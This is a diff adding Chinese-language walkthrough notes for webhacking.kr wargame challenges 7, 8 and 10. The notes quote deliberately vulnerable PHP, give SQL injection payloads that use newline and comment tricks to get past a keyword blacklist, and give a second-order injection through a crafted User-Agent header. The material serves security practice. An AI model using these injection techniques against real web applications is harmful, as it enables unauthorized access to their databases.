@@ -177,6 +177,215 @@ print a
 
 
 
+## challenge 7 ⭐️
+
+**tips:**
+
+```
+index.phps
+```
+
+```php
+<?
+$answer = "????";
+
+$go=$_GET[val];
+
+if(!$go) { echo("<meta http-equiv=refresh content=0;url=index.php?val=1>"); }
+
+$ck=$go;
+
+$ck=str_replace("*","",$ck);
+$ck=str_replace("/","",$ck);
+
+
+echo("<html><head><title>admin page</title></head><body bgcolor='black'><font size=2 color=gray><b><h3>Admin page</h3></b><p>");
+
+
+if(eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)) exit("Access Denied!");
+
+if(eregi(' ',$ck)) { echo('cannot use space'); exit(); }
+
+$rand=rand(1,5);
+
+if($rand==1)
+{
+$result=@mysql_query("select lv from lv1 where lv=($go)") or die("nice try!");
+}
+
+if($rand==2)
+{
+$result=@mysql_query("select lv from lv1 where lv=(($go))") or die("nice try!");
+}
+
+if($rand==3)
+{
+$result=@mysql_query("select lv from lv1 where lv=((($go)))") or die("nice try!");
+}
+
+if($rand==4)
+{
+$result=@mysql_query("select lv from lv1 where lv=(((($go))))") or die("nice try!");
+}
+
+if($rand==5)
+{
+$result=@mysql_query("select lv from lv1 where lv=((((($go)))))") or die("nice try!");
+}
+
+$data=mysql_fetch_array($result);
+if(!$data[0]) { echo("query error"); exit(); }
+if($data[0]!=1 && $data[0]!=2) { exit(); }
+
+
+if($data[0]==1)
+{
+echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
+alert('Access_Denied!')><p>");
+echo("<!-- admin mode : val=2 -->");
+}
+
+if($data[0]==2)
+{
+echo("<input type=button style=border:0;bgcolor='gray' value='auth' onclick=
+alert('Congratulation')><p>");
+@solve();
+} 
+?>
+```
+
+主要注意下面的代码
+
+```php
+$ck=str_replace("*","",$ck);
+$ck=str_replace("/","",$ck);
+.
+.
+.
+if(eregi("--|2|50|\+|substring|from|infor|mation|lv|%20|=|!|<>|sysM|and|or|table|column",$ck)) exit("Access Denied!");
+if(eregi(' ',$ck)) { echo('cannot use space'); exit(); }
+```
+
+**payload:**
+
+```
+http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0au*ni*on%0ase*le*ct%0a(3-1
+http://webhacking.kr/challenge/web/web-07/index.php?val=0)%0aunion%select%0a3-1%23
+```
+
+以上payload尝试失败遇到mod_security ⭐️
+
+
+
+## challenge 8
+
+查看源码
+
+```php
+<?
+
+$agent=getenv("HTTP_USER_AGENT");
+$ip=$_SERVER[REMOTE_ADDR];
+
+$agent=trim($agent);
+
+$agent=str_replace(".","_",$agent);
+$agent=str_replace("/","_",$agent);
+
+$pat="/\/|\*|union|char|ascii|select|out|infor|schema|columns|sub|-|\+|\||!|update|del|drop|from|where|order|by|asc|desc|lv|board|\([0-9]|sys|pass|\.|like|and|\'\'|sub/";
+
+//这里没有对单引号进行过滤且后面插入的时候会用到
+$agent=strtolower($agent);
+
+if(preg_match($pat,$agent)) exit("Access Denied!");
+
+//这里对单引号进行了过滤但是只是在查询的时候用到
+$_SERVER[HTTP_USER_AGENT]=str_replace("'","",$_SERVER[HTTP_USER_AGENT]);
+$_SERVER[HTTP_USER_AGENT]=str_replace("\"","",$_SERVER[HTTP_USER_AGENT]);
+
+$count_ck=@mysql_fetch_array(mysql_query("select count(id) from lv0"));
+if($count_ck[0]>=70) { @mysql_query("delete from lv0"); }
+
+
+$q=@mysql_query("select id from lv0 where agent='$_SERVER[HTTP_USER_AGENT]'");
+
+$ck=@mysql_fetch_array($q);
+
+if($ck)
+{ 
+echo("hi <b>$ck[0]</b><p>");
+if($ck[0]=="admin")
+
+{
+@solve();
+@mysql_query("delete from lv0");
+}
+
+
+}
+
+if(!$ck)
+{
+$q=@mysql_query("insert into lv0(agent,ip,id) values('$agent','$ip','guest')") or die("query error");
+echo("<br><br>done!  ($count_ck[0]/70)");
+}
+?>
+```
+
+这里考查的是比较基础的二次注入
+
+**payload:**
+
+```
+第一次
+insert into lv0(agent,ip,id) values('$agent','$ip','guest')
+User-Agent: admin','1','admin')#
+第二次
+User-Agent: admin
+```
+
+
+
+## challenge 9
+
+
+
+## challenge 10
+
+查看源码
+
+```html
+<a id=hackme style="position:relative;left:0;top:0" onclick="this.style.posLeft+=1;if(this.style.posLeft==800)this.href='?go='+this.style.posLeft" onmouseover=this.innerHTML='yOu' onmouseout=this.innerHTML='O'>O</a><br>
+```
+
+根据 JS 代码，使用下面 URL
+
+```
+http://webhacking.kr/challenge/codeing/code1.html?go=800
+```
+
+发现并没有什么异常，返回`no hack`
+
+这里有两种方法：
+
+**解法一:**
+
+```
+hackme.style.posLeft=799
+```
+
+然后点击 `a` 标签
+
+**解法二:**
+
+抓包，然后添加
+
+```
+Referer: http://webhacking.kr/challenge/codeing/code1.html
+```
+
+
+
 
 
 
